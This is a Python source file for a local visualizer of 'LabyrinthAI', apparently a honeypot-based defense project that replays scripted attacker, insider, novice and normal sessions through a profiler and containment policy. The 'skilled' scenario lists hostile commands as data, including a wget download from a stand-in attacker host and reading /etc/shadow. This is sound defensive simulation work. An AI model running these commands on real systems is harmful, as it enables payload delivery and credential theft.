"""Live overview of LabyrinthAI. Run: python visualizer/server.py  ->  http://localhost:8765

Replays a scripted attacker session through the REAL Profiler (features.py), the
integration adapter, and the REAL Maze (game.py + rules.py). Standard library HTTP only.
"""
from __future__ import annotations
import hashlib
import json
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlparse

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent
sys.path.insert(0, str(ROOT / "profiler"))
sys.path.insert(0, str(ROOT / "maze"))
sys.path.insert(0, str(ROOT / "genai"))

from features import FeatureExtractor  # noqa: E402
from game import MazeEnv, MazeState  # noqa: E402
from rules import choose_action  # noqa: E402
import company  # noqa: E402
from facts import build_chunks  # noqa: E402


def _data_file(*parts: str) -> Path | None:
    """Gitignored outputs live in the main checkout when running from a worktree."""
    candidates = [ROOT.joinpath(*parts)]
    if ROOT.parent.name == "worktrees":
        candidates.append(ROOT.parents[2].joinpath(*parts))
    return next((p for p in candidates if p.exists()), None)


def _t(sec: int) -> str:
    return f"2026-01-01T10:{sec // 60:02d}:{sec % 60:02d}Z"


# (seconds, source, event_type, extra fields, plain-English caption)
SCENARIOS = {
    "normal": [
        (0, "portal", "portal_auth_success", {"resource": "/login"}, "Logs into the staff portal"),
        (20, "database", "db_read", {"resource": "timesheets"}, "Opens their own timesheet"),
        (50, "database", "db_read", {"resource": "reports"}, "Reads a shared report"),
    ],
    # A real employee who asks for data outside their own access.
    "insider": [
        (0, "database", "db_read", {"resource": "payroll"}, "Asks to open everyone's salaries"),
        (10, "database", "db_read", {"resource": "board-minutes"}, "Opens confidential board minutes"),
        (22, "database", "db_read", {"resource": "contracts"}, "Browses customer contracts"),
        (35, "database", "db_read", {"resource": "finance"}, "Looks at the finance budget"),
    ],
    "skilled": [
        (0, "cowrie", "command", {"command": "whoami", "resource": "/bin/whoami"}, "Logs into the fake server and runs whoami"),
        (4, "cowrie", "command", {"command": "wget http://evil.test/p.sh", "resource": "/tmp/p.sh"}, "Downloads a tool onto the machine"),
        (7, "portal", "portal_auth_failure", {"resource": "/login"}, "Tries to guess the admin password on the web portal"),
        (9, "database", "db_read", {"resource": "customers"}, "Reads the customers table"),
        (11, "cowrie", "command", {"command": "sudo cat /etc/shadow", "resource": "/etc/shadow"}, "Tries to steal the password file"),
        (13, "database", "db_write", {"resource": "orders"}, "Writes into the orders table"),
        (14, "database", "db_write", {"resource": "customers"}, "Writes into the customers table"),
    ],
    "novice": [
        (0, "cowrie", "command", {"command": "ls", "resource": "/home"}, "Logs in and lists files"),
        (12, "cowrie", "command", {"command": "lss", "resource": "/home"}, "Makes a typo"),
        (31, "cowrie", "command", {"command": "pwd", "resource": "/home"}, "Checks where they are"),
        (58, "portal", "portal_auth_failure", {"resource": "/login"}, "Fails a portal login"),
        (90, "cowrie", "command", {"command": "help", "resource": "/home"}, "Asks for help, then goes quiet"),
    ],
}


def run_session(name: str) -> dict:
    events = SCENARIOS[name]
    extractor = FeatureExtractor()
    env = MazeEnv()
    steps, raw = [], []
    for i, (sec, source, etype, extra, caption) in enumerate(events):
        ev = {"session_id": name, "event_id": f"e{i}", "timestamp": _t(sec),
              "source": source, "event_type": etype, **extra}
        raw.append(ev)
        extractor.add_event(ev)
        f = extractor.features_for(name)
        # Same adapter as integration/run_all.py; exposure/alert capped at 2 so the state is non-terminal at reset.
        state = MazeState(
            turn=min(i, env.max_turns - 1),
            intel=min(3, int(f["distinct_resource_count"])),
            exposure=min(2, int(f["suspicious_command_count"])),
            alert=min(2, int(f["portal_auth_failure_count"] + f["wazuh_critical_severity_count"])),
            progress=min(3, int(f["database_write_count"] + f["database_delete_count"])),
        )
        obs, info = env.reset(options={"state": state})
        action = choose_action(obs, info["action_mask"])
        _, reward, terminated, truncated, step = env.step(action)
        steps.append({
            "caption": caption, "source": source, "event_type": etype,
            "features": {k: f[k] for k in ("event_count", "suspicious_command_count",
                                           "portal_auth_failure_count", "database_write_count",
                                           "wazuh_critical_severity_count", "distinct_resource_count")},
            "state": {k: getattr(state, k) for k in ("intel", "exposure", "alert", "progress")},
            "requested": step["requested_action"], "executed": step["executed_action"],
            "shielded": step["shielded"], "reward": round(reward, 2),
            "contained": bool(step["success"]), "ended": bool(terminated or truncated),
            "reason": step["termination_reason"],
        })
        if step["success"]:
            break
    digest = hashlib.sha256(json.dumps(raw[:len(steps)], sort_keys=True).encode()).hexdigest()
    return {"scenario": name, "steps": steps, "evidence_sha256": digest,
            "outcome": "contained" if steps[-1]["contained"] else "still watching"}


def overview() -> dict:
    world = company.build_world()
    out = {"genai": {"company": company.COMPANY_NAME, "employees": len(world["employees"]),
                     "systems": len(world["systems"]), "customers": len(world["customers"]),
                     "facts": len(build_chunks(world)), "valid": not company.validate(world)},
           "gatekeeper": None}
    report = _data_file("gatekeeper", "out", "report.json")
    if report:
        stage = json.loads(report.read_text(encoding="utf-8"))["stages"][0]
        labels = stage["label_distribution_all_clean_data"]
        out["gatekeeper"] = {"raw": stage["raw_rows_seen"], "clean": stage["clean_rows_kept"],
                             "attacks": stage["clean_rows_kept"] - labels.get("Benign", 0),
                             "classes": len(labels)}
    return out


class Handler(BaseHTTPRequestHandler):
    def _send(self, code: int, body: bytes, ctype: str):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        url = urlparse(self.path)
        static = {".html": "text/html; charset=utf-8", ".js": "text/javascript", ".css": "text/css"}
        name = "index.html" if url.path == "/" else url.path.lstrip("/")
        if "/" not in name and (HERE / name).is_file() and Path(name).suffix in static:
            self._send(200, (HERE / name).read_bytes(), static[Path(name).suffix])
        elif url.path == "/api/overview":
            self._send(200, json.dumps(overview()).encode(), "application/json")
        elif url.path == "/api/run":
            name = parse_qs(url.query).get("scenario", ["skilled"])[0]
            if name not in SCENARIOS:
                self._send(400, b'{"error":"unknown scenario"}', "application/json")
                return
            self._send(200, json.dumps(run_session(name)).encode(), "application/json")
        else:
            self._send(404, b"not found", "text/plain")

    def log_message(self, *args):
        pass


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8765
    print(f"LabyrinthAI visualizer -> http://localhost:{port}")
    ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
